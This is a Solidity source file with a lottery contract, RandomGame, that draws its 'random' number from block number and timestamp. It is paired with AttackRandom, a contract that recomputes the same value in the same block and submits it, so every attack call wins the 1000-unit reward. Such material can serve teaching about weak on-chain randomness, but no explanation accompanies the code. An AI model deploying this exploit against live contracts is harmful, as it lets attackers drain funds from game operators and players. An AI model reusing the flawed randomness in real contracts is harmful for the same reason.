pragma solidity ^0.4.24;

contract RandomGame{
    mapping (address => uint256) public balances;
    
    event LuckyLog(uint lucky_number, uint guess);

    function lucky(uint256 guess) public returns(uint256){
        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));
        uint256 lucky_number = uint256(keccak256(abi.encodePacked(seed))) % 100;
        if(lucky_number == guess){
            balances[msg.sender] += 1000;
        }
        emit LuckyLog(lucky_number,guess);
        return lucky_number;
    }
}

contract AttackRandom{
    RandomGame rg;
    
    function setTarget(address _addr) public {
        rg=RandomGame(_addr);
    }
    
    function attack() public returns(uint256){
        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));
        uint256 lucky_number = uint256(keccak256(abi.encodePacked(seed))) % 100;
        rg.lucky(lucky_number);
        return lucky_number;
    }
}